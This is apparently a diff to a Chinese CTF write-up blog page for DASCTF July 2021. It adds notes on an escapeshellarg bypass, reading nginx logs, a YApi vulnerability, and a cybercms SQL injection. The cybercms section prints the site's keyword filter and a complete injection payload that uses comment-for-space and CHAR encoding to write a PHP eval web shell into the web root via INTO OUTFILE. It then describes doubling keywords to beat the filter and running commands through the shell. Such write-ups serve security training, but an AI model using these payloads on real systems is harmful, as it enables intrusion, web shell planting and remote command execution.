@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">269</span>
+            <span class="post-count">674</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">3 min</span>
         </span>
     </span>
 </div>
@@ -112,8 +112,14 @@
 <p>猜测命令执行查看历史命令文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br></pre></td></tr></table></figure>
 
-<p>但是<code>escapeshellarg()</code>函数不会绕过。。。</p>
+<p><code>escapeshellarg()</code>函数  把字符串转码为可以在 shell 命令里使用的参数，不会绕过。。。</p>
 <p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">记录</a></p>
+<p>看过wp才知道要想读日志，nginx日志默认路径<code>/var/log/nginx/access.log</code></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123025756.png" alt="image-20210820123025756"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123606239.png" alt="image-20210820123606239"></p>
+<p><code>escapeshellarg()</code>利用非ascii字符绕过，%aa,%ba,%fa</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125330839.png" alt="image-20210820125330839"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125339970.png" alt="image-20210820125339970"></p>
 <h4 id="YApi"><a href="#YApi" class="headerlink" title="YApi"></a>YApi</h4><p>版本1.9.1   刚爆出个漏洞。</p>
 <p>注册，创建项目</p>
 <p><img src="/2021/08/01/21DASCTFJuly/image-20210801180737592.png" alt="image-20210801180737592"></p>
@@ -148,6 +154,30 @@
 <p>找到flag</p>
 <p><img src="/2021/08/01/21DASCTFJuly/image-20210801183006727.png" alt="image-20210801183006727"></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">参考</a></p>
+<h4 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h4><p>根据网上爆出了sql注入，在后台登陆处，</p>
+<p>然后根据目录扫描<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>=fl_html(f1_vvv(fl_value(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span>=fl_html(f1_vvv(fl_value(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">f1_vvv  函数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析源码得到过滤了<code>空格</code>和<code>0x</code>，fl_value函数对一些关键词做了过滤，</p>
+<p>判断5列</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912182056650.png" alt="image-20210912182056650"></p>
+<p>但是后门写马时候也要注意部分关键字被replace为空格</p>
+<p>后门马</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184824092.png" alt="image-20210912184824092"></p>
+<p>例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&amp;password&#x3D;dd&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;16&amp;submit.y&#x3D;29</span><br></pre></td></tr></table></figure>
+
+<p>response</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bad！hacker！&lt;br&gt;sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name&#x3D;&#39;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&#39; limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>select，outfile要双写</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183311495.png" alt="image-20210912183311495">、</p>
+<p>查看后门</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183414063.png" alt="image-20210912183414063"></p>
+<p>命令执行</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184256103.png" alt="image-20210912184256103"></p>
  
       <!-- reward -->
       
